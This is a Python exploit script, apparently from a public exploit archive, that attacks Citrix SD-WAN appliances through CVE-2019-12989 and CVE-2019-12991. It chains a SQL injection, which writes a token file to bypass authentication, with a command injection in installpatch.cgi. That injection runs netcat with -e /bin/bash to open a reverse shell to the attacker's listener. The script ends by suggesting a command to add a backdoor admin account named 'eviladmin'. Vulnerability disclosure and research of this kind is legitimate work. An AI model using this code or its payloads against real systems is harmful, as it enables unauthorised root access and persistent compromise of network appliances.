# Exploit Author: Chris Lyne (@lynerc)
# Vendor Homepage: https://www.citrix.com
# Product: Citrix SD-WAN
# Software Link: https://www.citrix.com/downloads/citrix-sd-wan/
# Version: Tested against 10.2.2
# Tested on: 
#	- Vendor-provided .OVA file
# CVE: CVE-2019-12989, CVE-2019-12991
#
# See Also:
# https://www.tenable.com/security/research/tra-2019-32
# https://medium.com/tenable-techblog/an-exploit-chain-against-citrix-sd-wan-709db08fb4ac
# https://support.citrix.com/article/CTX251987
#
# This code exploits both CVE-2019-12989 and CVE-2019-12991
# You&#039;ll need your own Netcat listener

import requests, urllib
import sys, os, argparse
import random
from OpenSSL import crypto
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

TIMEOUT = 10 # sec

def err_and_exit(msg):
    print &#039;\n\nERROR: &#039; + msg + &#039;\n\n&#039;
    sys.exit(1)

# CVE-2019-12989
# auth bypass via file write
def do_sql_injection(base_url):
    url = base_url + &#039;/sdwan/nitro/v1/config/get_package_file?action=file_download&#039;
    headers = { &#039;SSL_CLIENT_VERIFY&#039; : &#039;SUCCESS&#039; }
    token = random.randint(10000, 99999)
    json = {
        "get_package_file": {
            "site_name"         : "blah&#039; union select &#039;tenable&#039;,&#039;zero&#039;,&#039;day&#039;,&#039;research&#039; INTO OUTFILE &#039;/tmp/token_" + str(token) + "&#039;;#",
            "appliance_type"    : "primary",
            "package_type"      : "active"
        }
    }

    try:
        r = requests.post(url, headers=headers, json=json, verify=False, timeout=TIMEOUT)
    except requests.exceptions.ReadTimeout:
        return None

    # error is expected
    expected = {"status":"fail","message":"Invalid value specified for site_name or appliance_type"}
    if (r.status_code == 400 and r.json() == expected):
        return token
    else:
        return None

# CVE-2019-12991
# spawns a reverse shell
def do_cmd_injection(base_url, token, ncip, ncport):
    cmd = &#039;sudo nc -nv %s %d -e /bin/bash&#039; % (ncip, ncport) # 
    url = base_url + &#039;/cgi-bin/installpatch.cgi?swc-token=%d&installfile=`%s`&#039; % (token, cmd)
    success = False
    try:
        r = requests.get(url, verify=False, timeout=TIMEOUT)
    except requests.exceptions.ReadTimeout:
        success = True

    # a timeout is success. it means we should have a shell
    return success

##### MAIN #####

desc = &#039;Citrix SD-WAN Appliance Auth Bypass and Remote Command Execution&#039;
arg_parser = argparse.ArgumentParser(description=desc)
arg_parser.add_argument(&#039;-t&#039;, required=True, help=&#039;Citrix SD-WAN IP Address (Required)&#039;)
arg_parser.add_argument(&#039;-ncip&#039;, required=True, help=&#039;Netcat listener IP&#039;)
arg_parser.add_argument(&#039;-ncport&#039;, type=int, default=4444, help=&#039;Netcat listener port (Default: 4444)&#039;)

args = arg_parser.parse_args()

print "Starting... be patient. This takes a sec."

# Path to target app
base_url = &#039;https://&#039; + args.t

# do sql injection to get a swc-token for auth bypass
token = do_sql_injection(base_url)
if (token is None):
    err_and_exit(&#039;SQL injection failed.&#039;)

print &#039;SQL injection successful! Your swc-token is &#039; + str(token) + &#039;.&#039;

# if this worked, do the command injection
# create a new admin user and spawn a reverse shell
success = do_cmd_injection(base_url, token, args.ncip, args.ncport)

if success is False:
    err_and_exit(&#039;Not so sure command injection worked. Expected a timeout.&#039;)

print &#039;Seems like command injection succeeded.&#039;
print &#039;Check for your shell!\n&#039;
print &#039;To add an admin web user, run this command: perl /home/talariuser/bin/user_management.pl addUser eviladmin evilpassword 1&#039;

